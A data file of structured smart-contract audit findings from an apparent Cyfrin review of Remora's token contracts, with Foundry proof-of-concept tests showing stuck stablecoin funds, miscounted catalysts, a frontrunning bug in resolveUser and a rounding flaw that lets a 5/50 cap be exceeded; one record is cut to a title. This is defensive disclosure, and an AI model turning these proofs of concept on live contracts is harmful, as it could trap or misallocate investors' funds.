{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-012", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 12, "page_start": null, "title": "Calling `PaymentSettler::setStableCoin` can lead to inability of holders to claim funds and old stablecoin being trapped in the contract", "short_summary": null, "description_md": null, "full_markdown": "### Calling `PaymentSettler::setStableCoin` can lead to inability of holders to claim funds and old stablecoin being trapped in the contract\n\n**Description:** An admin can call `PaymentSettler::setStablecoin` at any time. As the code is currently design this should only be done when the stablecoin balance of the contract is zero, which is a very rare occurrence given that many tokens will be at various stages of the their lifecycle.\n\nFor instance, if `setStablecoin` were called in the middle of the burning phase of a central token, it would lead to the inability of some users to burn their tokens. This also holds if there are outstanding payouts to claim before burning is enabled.\n\nAs it is not unknown for stablecoins to become de-pegged (even [USDC de-pegged for a few hours](https://cointelegraph.com/news/usdc-depegs-as-circle-confirms-3-3b-stuck-with-silicon-valley-bank)), a method for migrating from one stablecoin to another must be implemented.\n\n**Impact:** Changing the stablecoin may well become necessary if the current stablecoin loses its value. The problem then is that all currently active central tokens become affected by the change (and the existing funds become stuck).\n\nThe impact is two-fold:\n1.  Any existing stable coins are trapped in the contract as there is no way to get them out.\n2. Users are unable to either claim payouts or burn their tokens.\n\nAs this is a High Impact, but Low Likelihood bug its impact has been assessed as Medium.\n\n**Proof of Concept:** Add the following test to `PaymentSettlerTest.t.sol`. It demonstrates that a user would be unable to burn their tokens if `setStablecoin`\n\n```solidity\n    function test_cyfrin_setStablecoinCanLeadToDOS() public {\n        address user0 = getDomesticUser(0);\n        address user1 = getDomesticUser(1);\n        address central = address(centralTokenProxy);\n\n        centralTokenProxy.mint(address(this), 10_000);\n        centralTokenProxy.dynamicTransfer(user0, 5_000);\n        centralTokenProxy.dynamicTransfer(user1, 5_000);\n\n        paySettlerProxy.initiateBurning(central);\n        vm.warp(1 days + 1);\n\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), 1_000_000e6);\n        paySettlerProxy.enableBurning(central, address(this), 1_000_000e6);\n\n        // User 0 burns their tokens\n        vm.prank(user0); d_childTokenProxy.burn();\n\n        Stablecoin newStableCoin = new Stablecoin(\"DAI\", \"DAI\", type(uint256).max/1e6, 6);\n        paySettlerProxy.setStablecoin(address(newStableCoin));\n\n        vm.startPrank(user1);\n        vm.expectPartialRevert(bytes4(keccak256(\"ERC20InsufficientBalance(address,uint256,uint256)\")));\n        d_childTokenProxy.burn();\n    }\n```\n\n**Recommended Mitigation:** Initially, it might seem that one elegant solution to the problem is to store a copy of the current stablecoin address in the `TokenData` structure. This has the advantage of allowing holders of existing central tokens to still claim the funds they are entitled to. In the case that the stablecoin has gone down in value the loss has been socialised to everyone who was entitled to that stablecoin. Whether this is acceptable or not will affect the mitigation, but it is _one_ solution.\n\nHowever, the solution outline above does not take into account calling the following scenario:\n- `distributePayout`\n- followed by `setStableCoin`\n- followed by `distributePayment` or `enableBurning`\n\nThus, to handle the transition from one stablecoin to the next (possibly multiple times) it will be necessary to store the address of the stablecoin on a _per-payout_ and _per-enable-burn_ basis, which adds significant complexity.\n\nAnother solution would be to prevent calling `setStablecoin` unless all current central tokens were inactive. However, this does not account for the stablecoin-de-pegging scenario.\n\nA third solution would involve withdrawing the existing stablecoins and replacing them with an equivalent amount of the new stablecoin, however, this would shift the risk of a de-pegging event to Remora.\n\nThere are many design considerations to take into account.\n\n**Remora:** Fixed at commit [470ed74](https://github.com/remora-projects/remora-dynamic-tokens/commit/470ed749b6657d74746910129865964c053102ab)\n\n**Cyfrin:** Verified. PaymentSettler transfers the balance of the existing stablecoin to the custodian (which includes fees), resets fees, and pulls the same amount of required stablecoin of the new stablecoin that the system must have to process payouts.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-013", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 13, "page_start": null, "title": "Removing Individuals from groups doesn't properly decrement the `groups.numCatalyst` to track the number of catalysts on that group", "short_summary": null, "description_md": null, "full_markdown": "### Removing Individuals from groups doesn't properly decrement the `groups.numCatalyst` to track the number of catalysts on that group\n\n**Description:** When removing an individual from a group, the `group.numCatalyst` counter only checks if the individual's `numCatalyst` is != 0; if so, it decrements `group.numCatalyst` by 1, regardless of how many entities the individual is a catalyst for.\nThe problem is that each individual can be a catalyst on multiple entities, and each time the individual is set as the catalyst on an entity, both the individual and the group `numCatalyst` grow.\n```solidity\n//FiveFiftyRule.sol//\n    function createEntity(\n        ...\n    ) external restricted {\n        ...\n        uint16 gid = individualData[catalyst].groupId;\n//@audit-info => The same catalyst increments the numCatalyst counter on the group each time it's added as a catalyst on a != entity!\n@>      if (gid != 0) ++groups[gid].numCatalyst;\n\n        ...\n    }\n\n    function removeIndividual(uint16 id, address individual) external restricted {\n        ...\n        GroupData storage gData = groups[id];\n//@audit-issue => Decrements the group numCatalysts only by one, regardless of how many times the individual is a catalyst on != entities\n@>      if (iData.numCatalyst != 0) --gData.numCatalyst;\n\n        ...\n    }\n\n```\n\nSo, the `group.numCatalyst` increments each time an individual is set as a catalyst on an entity, but when the individual is removed from the group, `group.numCatalyst` decrements by one, regardless of how many times it was incremented because of the individual being assigned as a catalyst on multiple entities.\n\n**Impact:** `groups.numCatalyst` can be incorrect and fail to accurately track the actual number of catalysts among all entities where individuals are registered as catalysts. This can cause the execution path in the `FiveFiftyRule::canTransfer` function to follow the wrong path and, subsequently, make incorrect updates to the accounting.\n\n**Proof of Concept:** In the below PoC, it is demonstrated that the same individual can be assigned as a catalyst for two entities; this will cause the individual and group `numCatalyst` to increase to two, and when the individual is removed from the group he belongs to, the `group.numCatalyst` will only be decremented by one, which will leave the accounting incorrectly considering there is an individual on the group who is a catalyst on an entity.\n\nAdd the next PoC to the `FiveFiftyRuleTest.t.sol` test file:\n```solidity\n    function test_numCatalystInGroupsPoC() public {\n        // create group with one member\n        address u = getDomesticUser(0);\n        address u2 = getDomesticUser(1);\n        address[] memory inds = new address[](2);\n        inds[0] = u;\n        inds[1] = u2;\n\n        uint16 gid = 10;\n\n        address entityA = makeAddr(\"entityA\");\n        address entityB = makeAddr(\"entityB\");\n\n        fiveFiftyProxy.createGroup(gid, inds);\n\n        //@audit => Create two entities where individual `u` is the catalyst\n        fiveFiftyProxy.createEntity(entityA, u, 100, 100, inds);\n        fiveFiftyProxy.createEntity(entityB, u, 100, 100, inds);\n\n        assertEq(fiveFiftyProxy.getGroupNumCatalyst(gid), 2);\n\n        //@audit => Remove the only user of the group who is a numCatalyst on entities\n        fiveFiftyProxy.removeIndividual(gid, u);\n        //@audit-issue => The numCatalyst is left as 1 even though any of the remaining individuals in the group is a catalyst on an entity\n        assertEq(fiveFiftyProxy.getGroupNumCatalyst(gid), 1);\n    }\n```\n\n**Recommended Mitigation:** Consider refactoring the accounting to track the `group.numCatalyst` correctly, ensuring it is updated when removing and adding individuals to a group, as well as when setting an individual as a catalyst of an entity. Ensure there is a symmetric relation among these operations.\n\n**Remora:** Fixed at commit [588b165](https://github.com/remora-projects/remora-dynamic-tokens/commit/588b165ddf74a8ef94035f47bfaac878a35dbfa1).\n\n**Cyfrin:** Verified.  `group.numCatalyst` counter increments and decrements symmetrically. Regardless of how many times the same individual serves as a catalyst for different entities, the count `group.numCatalyst` only increases by 1 for each individual who is a catalyst.\n\n\\clearpage\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-014", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 14, "page_start": null, "title": "Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice", "short_summary": null, "description_md": null, "full_markdown": "### Frontrunning call to `ChildToken::resolveUser` and transferring all of the oldUser's `childToken` balance causes the `totalInvestor` counter to be decremented twice\n\n**Description:** When resolving a user to migrate his tokens, lock progress, and payouts from an address to a new address, the balance of `ChildToken` of the `oldAddress` is transferred by directly calling the `super:_transfer`, which bypasses the overrides of the `super::_transfer`. Calling `super::_transfer` bypasses a protection that returns the execution early when transferring a zero value.\nThis allows the execution to reach `ChildToken::_update()` with a balance of 0 for the `from` account and a transfer of zero value. As a result, the `totalInvestors` counter will be decremented, because the condition evaluating whether the sender is zeroing out their balance will be met.\n```solidity\n//ChildToken.sol//\n\n    function resolveUser(address oldAddress, address newAddress) external nonReentrant restricted {\n        ...\n @>     super._transfer(oldAddress, newAddress, value); // tokens already locked with _newAccountSameLocks\n    }\n\n    function _update(\n        address from,\n        address to,\n        uint256 value\n    ) internal override {\n @>     if (from != address(0) && balanceOf(from) - value == 0) --totalInvestors;\n        if (to != address(0) && balanceOf(to) == 0) ++totalInvestors;\n\n        ...\n    }\n```\n\nThe previous behavior when resolving a user who has no balance allows for legitimate executions to determine users to be griefed and force the `totalInvestors` counter to be decremented twice. One for the frontran transaction, which transfers all the `oldAddress` tokens (because the sender is zeroing out their balance). Again, when the transaction calling `ChildToken::resolveUser` is executed and resolves the user with a zero balance (as explained above), this will also cause `investorBalance` to be decremented.\n\n\n**Impact:** The `totalInvestor` counter is decremented twice, which causes the system to inaccurately track the actual number of investors in the system.\nThis issue can cause transfers of other investors to fall into DoS when transferring all their balances (given sufficient manipulations of the `totalInvestor` counter). However, thanks to the lock-up periods, the likelihood of reaching a DoS state is low.\n\n**Proof of Concept:** Add the following PoC to `ChildTokenAdminTest.t.sol`:\n```solidity\n    function test_resolveUser_FrontRanHijacks_totalInvestorCounter() public {\n        address oldUser = getDomesticUser(1);\n        address newUser = getDomesticUser(2);\n        address extraInvestor = getDomesticUser(3);\n\n        centralTokenProxy.mint(address(this), uint64(1));\n        centralTokenProxy.dynamicTransfer(extraInvestor, 1);\n\n        // Seed: old user has 3 tokens (locked by default on mint)\n        centralTokenProxy.mint(address(this), uint64(3));\n        centralTokenProxy.dynamicTransfer(oldUser, 3);\n        assertEq(d_childTokenProxy.balanceOf(oldUser), 3);\n\n        // Distribute payout via PaymentSettler -> Central -> Child\n        IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);\n        paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6) total\n\n        assertEq(d_childTokenProxy.totalInvestors(), 2);\n\n        uint32 DEFAULT_LOCK_TIME = 365 days;\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n\n        //@audit-info => `oldUser` frontruns `resolveUser()` and transfers all of his balance!\n        vm.prank(oldUser);\n        d_childTokenProxy.transfer(newUser, 3);\n\n        //@audit-info => Doesn't revert even though `oldUser` has 0 balance\n        // Resolve: move state to newUser (already allowlisted + signed in base)\n        d_childTokenProxy.resolveUser(oldUser, newUser);\n\n        //@audit-issue => Only 1 investor when in reality are 2 (newUser and extraInvestor)\n        assertEq(d_childTokenProxy.totalInvestors(), 1);\n\n        //@audit-info => newUser transfers all his tokens to extraInvestor - totalInvestors shrinks\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n        vm.prank(newUser);\n        d_childTokenProxy.transfer(extraInvestor, 3);\n        assertEq(d_childTokenProxy.totalInvestors(), 0);\n\n        //@audit-issue => underflow because totalInvestors is 0 and extraInvestor is transferring all of his balance\n        vm.warp(block.timestamp + DEFAULT_LOCK_TIME);\n        vm.prank(extraInvestor);\n        vm.expectRevert();\n        d_childTokenProxy.transfer(newUser, 4);\n    }\n```\n\n**Recommended Mitigation:** Consider adding a check to validate if the `oldAddress` `balanceOf` ChildToken is 0, if so, revert the tx.\n\n**Remora:** Fixed at commit [6f53406](https://github.com/remora-projects/remora-dynamic-tokens/commit/6f53406266490f5ad66202fb82efef7d64980955)\n\n**Cyfrin:** Verified. Added a check to call `super._transfer()` only when the `oldAddress` has a balance.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-015", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 15, "page_start": null, "title": "Minting in between disabling and re-enabling burning leads to stuck funds and dilution of later burners", "short_summary": null, "description_md": null, "full_markdown": "### Minting in between disabling and re-enabling burning leads to stuck funds and dilution of later burners\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-016", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 16, "page_start": null, "title": "`FiveFiftyRule::_updateEntityAllowance` rounds in wrong direction for entity allowance subtraction", "short_summary": null, "description_md": null, "full_markdown": "### `FiveFiftyRule::_updateEntityAllowance` rounds in wrong direction for entity allowance subtraction\n\n**Description:** Function `_updateEntityAllowance` is used to either increase/decrease the entity allowance based on where parameter `add` is `true`/`false`.\n\nWhen `add == false`, `adjusted_amt` is the amount to subtract. However, it is truncated because division is involved.\nThis means that `aData.allowance - adjusted_amt` will be bigger than the true value.\n\nIn the worse case scenario this can mean that the allowance is now too large and that a subsequent transfer to the entity will make it violate the 5/50 rule.\n\n**Impact:** In extreme cases the 5/50 rule can be violated. The bug identified in Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) makes this much more likely as division before multiplication results in values that are much smaller than the true value.\n\n**Proof of Concept:**\n1. This diff will fix bugs that obscure this particular problem.\n\n```diff\n@@ -465,8 +465,8 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         uint256 len = ents.length;\n         for (uint256 i; i<len; ++i) {\n             EntityData memory a = entityData[ents[i]];\n-            if (a.catalyst == inv &&\n-                (REMORA_PERCENT_DENOMINATOR / a.equity) * amount >\n+            if (a.catalyst == inv &&\n+                REMORA_PERCENT_DENOMINATOR * amount / a.equity >\n                     entityData[ents[i]].allowance\n             ) return false;\n         }\n@@ -505,16 +505,16 @@ contract FiveFiftyRule is UUPSUpgradeable, AccessManagedUpgradeable {\n         // to side changes\n         if (to != address(0)) {\n             IndividualData storage iTo = individualData[to];\n-\n+\n             if (iTo.isEntity) { // if entity\n-                if (entityData[to].allowance <= amount) {\n-                    entityData[to].allowance -= SafeCast.toUint64(amount);\n+                if (entityData[to].allowance >= amount) {\n+                    entityData[to].allowance -= SafeCast.toUint64(amount);\n\n                     iTo.lastBalance += SafeCast.toUint64(amount);\n                     emit FiveFiftyApproved(from, to, amount);\n                     return true;\n                 } else revert ();\n```\n\n2. This proof of concept shows that it is possible for the catalyst to have an exposure equal to the 10% (when they should always be below it at 9.999999%).\n\n**NOTE**: If the \"division before multiply\" bug from Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded) is not fixed then a value of `CATALYST_BAL = 700_000` will still not revert leading to the effective cap being exceeded by approximately 2%!\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.30;\n\nimport \"forge-std/console2.sol\";\nimport {RemoraTestBase} from \"../RemoraTestBase.sol\";\nimport {FiveFiftyRule} from \"../../../contracts/Compliance/FiveFiftyRule.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {SafeCast} from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\n\n\ncontract FiveFiftyRule_RoundingPoC is RemoraTestBase {\n    FiveFiftyRule internal fiveFiftyRule;\n\n    // helpers (same as your math discussion)\n    uint256 constant DENOM = 1_000_000;\n\n    function setUp() public override {\n        RemoraTestBase.setUp();\n\n        // Deploy rule and initialize\n        fiveFiftyRule = FiveFiftyRule(address(new ERC1967Proxy(address(new FiveFiftyRule()), \"\")));\n        fiveFiftyRule.initialize(address(accessMgrProxy), 0);\n\n        // Allow our test to call restricted functions on fiveFiftyRule and child\n        bytes4[] memory sel = new bytes4[](1);\n        sel[0] = FiveFiftyRule.addToken.selector;\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), sel, ADMIN_TOKEN_ID);\n        accessMgrProxy.grantRole(ADMIN_TOKEN_ID, address(this), 0);\n\n        bytes4[] memory cs = new bytes4[](2);\n        cs[0] = bytes4(keccak256(\"setFiveFiftyCompliance(address)\"));\n        cs[1] = bytes4(keccak256(\"setLockUpTime(uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(d_childTokenProxy), cs, ADMIN_TOKEN_ID);\n\n        // Wire fiveFiftyRule to domestic child; remove lockup\n        d_childTokenProxy.setFiveFiftyCompliance(address(fiveFiftyRule));\n        d_childTokenProxy.setLockUpTime(0);\n    }\n\n    function test_RoundingDown_Allows_ExtraEntityToken_ExceedingLookThroughCap() public {\n        // --------------------------\n        // Parameters we use for the PoC\n        // --------------------------\n        // Total supply: large, so we can transfer a very large amount to the catalyst without violating the cap.\n        // We'll target a 50% cap for the catalyst (to leave room for a huge direct transfer).\n        uint64 totalSupply = 10_000_000;\n        uint32 capPercent = 100_000;\n        uint64 capAmountMicros = totalSupply * capPercent;\n\n        uint64 equityMu = 333_334;\n        uint256 ENTITY_BAL = 1_500_000;\n        uint256 CATALYST_BAL = 499_999;\n\n        centralTokenProxy.mint(address(this), totalSupply);\n        fiveFiftyRule.addToken(address(centralTokenProxy));\n\n        // Choose a catalyst (a domestic user) and an entity address\n        address entity = getDomesticUser(0);\n        address catalyst = getDomesticUser(1);\n        address otherInvestor = getDomesticUser(2); // will never directly own any tokens in this example\n        address[] memory investors = new address[](2);\n        investors[0] = catalyst;\n        investors[1] = otherInvestor;\n\n        bytes4[] memory psel = new bytes4[](1);\n        psel[0] = bytes4(keccak256(\"setMaxPercentIndividual(address,uint32)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), psel, ADMIN_TOKEN_ID);\n        fiveFiftyRule.setMaxPercentIndividual(catalyst, capPercent);\n\n\n        bytes4[] memory esel = new bytes4[](2);\n        esel[0] = bytes4(keccak256(\"createEntity(address,address,uint64,uint64,address[])\"));\n        esel[1] = bytes4(keccak256(\"setCatalyst(bool,address,address,uint64,uint64)\"));\n        accessMgrProxy.setTargetFunctionRole(address(fiveFiftyRule), esel, ADMIN_TOKEN_ID);\n\n\n        uint64 calculatedAllowance = SafeCast.toUint64(totalSupply * 1e6 * capPercent / equityMu);\n        console2.log(\"calculatedAllowance: %s\", calculatedAllowance);\n\n        // Check that allowance is correct\n        uint256 userProportion = calculatedAllowance * equityMu / 1e6;\n        assertEq(userProportion, capAmountMicros - 1);\n\n        uint256 exposure = uint256(ENTITY_BAL)* 1e6 * equityMu / 1e6 + CATALYST_BAL * 1e6;\n        console2.log(\"exposure: %s\", exposure);\n        assertGe(exposure, capAmountMicros);\n\n\n        fiveFiftyRule.createEntity(entity, catalyst, equityMu, calculatedAllowance, investors);\n        centralTokenProxy.dynamicTransfer(entity, ENTITY_BAL);\n        logEntity(\"0\", entity);\n        logIndividual(\"entity 0\", entity);\n        logIndividual(\"catalyst 0\", catalyst);\n\n        centralTokenProxy.dynamicTransfer(catalyst, CATALYST_BAL);\n        logEntity(\"1\", entity);\n        logIndividual(\"entity 1\", entity);\n        logIndividual(\"catalyst 1\", catalyst);\n\n    }\n\n    function logEntity(string memory s, address entity) internal view {\n        FiveFiftyRule.EntityData memory ed = fiveFiftyRule.testing_entityData(entity);\n        console2.log(\"---  EntityData %s ---\", s );\n        console2.log(\"catalyst:     %s\", ed.catalyst);\n        console2.log(\"equity:       %s\", ed.equity);\n        console2.log(\"allowance:    %s\", ed.allowance);\n    }\n\n    function logIndividual(string memory s, address individual) internal view {\n        FiveFiftyRule.IndividualData memory id = fiveFiftyRule.testing_individualData(individual);\n        console2.log(\"---  IndividualData %s ---\", s);\n        console2.log(\"isEntity:         %s\", id.isEntity);\n        console2.log(\"numCatalyst:      %s\", id.numCatalyst);\n        console2.log(\"groupId:          %s\", id.groupId);\n        console2.log(\"customMaximum:    %s\", id.customMaximum);\n        console2.log(\"lastBalance:      %s\", id.lastBalance);\n\n    }\n}\n```\n\n**Recommended Mitigation:** The `adjusted_amt` must be rounded up when `add == false`.\n\nUpdate the code as below, assuming the existence of `_mulDivFloor` and `_mulDivCeil`, which round down/up respectively.\nIt also includes the fix from Issue [*Divide before multiply loses precision in `FiveFiftyRule::_updateEntityAllowance` and leads to caps being exceeded*](#divide-before-multiply-loses-precision-in-fivefiftyruleupdateentityallowance-and-leads-to-caps-being-exceeded).\n\n```solidity\nfunction _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {\n    uint8 numCatalyst = individualData[inv].numCatalyst;\n    uint256 len = findEntity[inv].length;\n\n    for (uint256 i; i < len; ++i) {\n        if (numCatalyst == 0) break;\n\n        EntityData storage aData = entityData[findEntity[inv][i]];\n        if (aData.catalyst != inv) continue;\n        --numCatalyst;\n\n        uint256 adjusted;\n        if (add) {\n            adjusted = _mulDivFloor(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);\n            aData.allowance += SafeCast.toUint64(adjusted);\n        } else {\n            adjusted = _mulDivCeil(amount, REMORA_PERCENT_DENOMINATOR, aData.equity);\n            uint64 adj64 = SafeCast.toUint64(adjusted);\n            if (adj64 > aData.allowance) return false;\n            aData.allowance -= adj64;\n        }\n    }\n    return true;\n}\n```\n\n**Remora:** Fixed at commit [e12af9d](https://github.com/remora-projects/remora-dynamic-tokens/commit/e12af9dd70476a143f444a793aff3538b136ca1a).\n\n**Cyfrin:** Verified. Implemented recommended mitigation.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1-017", "doc_id": "cyfrin_2025-10-22-cyfrin-remora-dynamic-tokens-v2.1", "finding_index": 17, "page_start": null, "title": "In `FiveFiftyRule` add check that `equity != 0` in functions `createEntity` and `setCatalyst`", "short_summary": null, "description_md": null, "full_markdown": "### In `FiveFiftyRule` add check that `equity != 0` in functions `createEntity` and `setCatalyst`\n\n**Description:** If `equity` is ever set to zero then `_checkEntityAllowance` will revert on division by zero which will prevent all transfers that pass through the code paths involving `_checkEntityAllowance`.\n\nThis will occur any time a transfer involves a transfer to a `to` address which is\n- part of a group with an individual that is a catalyst\n- is an individual that is a catalyst\n\n**Impact:** Minimal. Reverts will happen until an admin calls `setCatalyst` to update the `equity` to a non-zero value.\n\n**Remora:** Fixed at commit [511e7da](https://github.com/remora-projects/remora-dynamic-tokens/commit/511e7da2038e669f628c8232fd8f37c1e6798fab).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/remora-projects/remora-dynamic-tokens", "org": "remora-projects", "name": "remora-dynamic-tokens", "commit": "cc447da9fca1a997ffbb34f4d099be8f7dce7133", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-10-22-cyfrin-remora-dynamic-tokens-v2.1.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.932064+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.933423+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
